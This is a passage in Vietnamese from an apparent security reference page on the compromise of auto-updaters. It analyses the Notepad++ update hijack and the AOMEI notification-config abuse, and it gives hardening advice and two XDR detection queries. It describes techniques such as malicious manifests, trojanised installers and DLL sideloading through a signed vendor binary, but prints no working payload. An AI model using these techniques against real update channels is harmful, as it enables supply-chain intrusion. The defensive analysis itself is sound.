Từ tháng 6/2025 đến tháng 12/2025, những kẻ tấn công xâm nhập hạ tầng hosting đứng sau luồng update của Notepad++ đã chọn lọc gửi manifest độc hại cho các nạn nhân được nhắm mục tiêu. Các updater cũ dựa trên WinGUp không xác minh đầy đủ tính xác thực của update, vì vậy phản hồi XML độc hại có thể chuyển hướng client đến URL do attacker kiểm soát. Do client chấp nhận nội dung HTTPS mà không yêu cầu đồng thời chuỗi certificate đáng tin cậy và PE signature hợp lệ trên installer đã tải xuống, nạn nhân đã tải về và thực thi một `update.exe` NSIS bị cài trojan.<sup>[[12]](#references)[[13]](#references)</sup>

Luồng vận hành (không cần local exploit):
1. **Chặn hạ tầng**: xâm nhập CDN/hosting và phản hồi các yêu cầu kiểm tra update bằng metadata do attacker cung cấp, trỏ đến URL tải xuống độc hại.
2. **NSIS bị cài trojan**: installer tải/thực thi payload và lạm dụng hai chuỗi thực thi:
   - **Dùng binary đã ký của mình + sideload**: đóng gói `BluetoothService.exe` đã được Bitdefender ký và đặt một `log.dll` độc hại trong đường dẫn tìm kiếm của nó. Khi binary đã ký chạy, Windows sideload `log.dll`; DLL này giải mã và nạp backdoor Chrysalis theo kiểu reflective (được bảo vệ bằng Warbird + API hashing để cản trở phát hiện tĩnh).
   - **Tiêm shellcode bằng script**: NSIS thực thi một script Lua đã biên dịch, sử dụng Win32 API (ví dụ: `EnumWindowStationsW`) để tiêm shellcode và staging Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Bài học về hardening/phát hiện áp dụng cho mọi auto-updater:
- Bắt buộc **xác minh certificate + signature** của installer đã tải xuống (pin signer của vendor, từ chối CN/chain không khớp) và ký chính manifest update (ví dụ: XMLDSig). Chặn chuyển hướng do manifest kiểm soát trừ khi đã được xác thực.
- Xem **BYO binary đã ký sideloading** là một điểm pivot phát hiện sau khi tải xuống: cảnh báo khi một vendor EXE đã ký nạp DLL có tên nằm ngoài đường dẫn cài đặt chuẩn của nó (ví dụ: Bitdefender nạp `log.dll` từ Temp/Downloads), và khi updater thả/thực thi installer từ temp có chữ ký không phải của vendor.
- Giám sát **các dấu vết đặc thù của malware** được quan sát trong chuỗi này (hữu ích làm pivot tổng quát): mutex `Global\Jdhfv_1.0.1`, các lần ghi bất thường của `gup.exe` vào `%TEMP%`, và các giai đoạn tiêm shellcode do Lua điều khiển.
- Notepad++ đã phản hồi bằng cách tăng cường WinGUp từ v8.8.9 trở đi: XML trả về hiện được ký (XMLDSig), và các bản build mới hơn yêu cầu xác minh certificate + signature của installer đã tải xuống thay vì chỉ tin vào lớp truyền tải.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideloading <code>log.dll</code> bằng EXE có chữ ký Bitdefender (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> khởi chạy trình cài đặt không phải của Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Các mô hình này áp dụng cho mọi trình cập nhật chấp nhận manifest không có chữ ký hoặc không cố định danh tính người ký của trình cài đặt: chiếm quyền mạng + trình cài đặt độc hại + sideloading bằng chữ ký do kẻ tấn công tự tạo dẫn đến thực thi mã từ xa dưới vỏ bọc các bản cập nhật “đáng tin cậy”.

### Cấu hình thông báo làm cơ chế kích hoạt cập nhật thứ hai

Trình cập nhật có thể dùng các cấu hình từ xa riêng biệt để **đưa nội dung vào và kích hoạt thực thi nội dung đó**. Điều này đòi hỏi quyền kiểm soát các cấu hình hoặc phản hồi của chúng; các báo cáo không xác định cách thức truy cập vào nguồn đã bị chiếm quyền. Trong vụ việc AOMEI, `down_html.ini` chỉ định URL archive, phiên bản (`thrid`) và MD5 (`Val`); kẻ tấn công tăng phiên bản, đồng thời thay đổi URL và checksum tương ứng. Đây là lỗi [ranh giới tin cậy của metadata](#2-hijacking-the-update-channel-to-run-code-as-system) đã đề cập ở trên. Đường thực thi bổ sung nằm ở `Notifycfg.ini`: tệp này hướng dẫn `ABNotify.exe` tải `upgrade-now.html` đã giải nén thông qua URL `file:///` cục bộ trong WebView. Trang này tự động chuyển hướng đến một tệp thực thi cùng thư mục, và WebView chuyển tệp đó cho system shell. Tiến trình con kế thừa quyền của trình thông báo; điều này không tự động nâng quyền tiến trình lên SYSTEM.<sup>[[17]](#references)[[18]](#references)</sup>

Google cũng báo cáo về một `Notifycfg.ini` bị sửa đổi, chứa hơn 35.000 section giả lặp lại, qua đó vượt qua cơ chế kiểm tra phiên bản thông thường của client này. Báo cáo không chứng minh rằng đây là cách vượt qua parser nói chung. Kẻ tấn công khôi phục các tệp từ xa sau mỗi khoảng thời gian từ năm đến mười phút, nên chỉ các client polling trong những khoảng thời gian đó mới nhận được cấu hình đã thay đổi. Kênh thông báo này cũng mang một [mồi nhử WebDAV/NTLM coercion](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion) riêng, không cần archive được thực thi.<sup>[[18]](#references)</sup>

---
## References
- [1] [Khuyến cáo – Netskope Client cho Windows – Leo thang đặc quyền cục bộ qua máy chủ giả mạo (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Khuyến cáo bảo mật Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – plugin Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – client/exploit IPC của Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Khai thác ASUS DriverHub, MSI Center, Acer Control Centre và Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Leo thang đặc quyền cục bộ qua các tệp có thể ghi trong Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Leo thang đặc quyền trong agent Windows](https://checkmk.com/werk/16361)
- [10] [Các PoC của sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Các tác nhân cấp quốc gia khai thác chuỗi cung ứng Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – cập nhật sự cố hạ tầng bị chiếm quyền](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Vượt qua bản sửa lỗi CVE-2025-0309 trong Netskope Client cho Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Phát hiện lỗi leo thang đặc quyền trong Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – Trình cập nhật MyReport: Từ gRPC đến SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [ManageEngine Threat Analysis Lab – Xâm phạm chuỗi cung ứng AOMEI Backupper](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group và Mandiant – Điều tra hành vi can thiệp chuỗi cung ứng trong thời gian ngắn](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
